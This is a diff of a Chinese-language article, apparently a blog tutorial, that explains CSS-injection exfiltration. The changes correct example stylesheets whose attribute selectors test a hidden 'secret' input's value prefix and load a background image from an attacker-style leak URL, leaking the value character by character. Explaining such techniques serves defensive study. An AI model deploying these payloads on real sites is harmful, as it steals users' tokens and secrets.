@@ -71,21 +71,21 @@ input[name="secret"][value^="z"] {
 當瀏覽器收到 response 的時候，就會先載入上面這一段 CSS，載入完以後符合條件的元素就會發 request 到後端，假設第一個字是 d 好了，接著 server 這時候才回傳 `https://myserver.com/payload?len=2` 的 response，內容為：
 
 ``` css
-input[name="secret"][value^="a"] {
-  background: url(https://b.myserver2.com/leak?q=da)
+input[name="secret"][value^="da"] {
+  background: url(https://b.myserver.com/leak?q=da)
 }
 
-input[name="secret"][value^="b"] {
+input[name="secret"][value^="db"] {
   background: url(https://b.myserver.com/leak?q=db)
 }
 
-input[name="secret"][value^="c"] {
+input[name="secret"][value^="dc"] {
   background: url(https://b.myserver.com/leak?q=dc)
 }
 
 //....
 
-input[name="secret"][value^="z"] {
+input[name="secret"][value^="dz"] {
   background: url(https://b.myserver.com/leak?q=dz)
 }
 ```
@@ -121,7 +121,7 @@ input[name="secret"][value^="z"] {
 
 ``` css
 input[name="secret"][value^="a"] {
-  background: url(https://b.myserver2.com/leak?q=a)
+  background: url(https://b.myserver.com/leak?q=a)
 }
 
 input[name="secret"][value^="b"] {
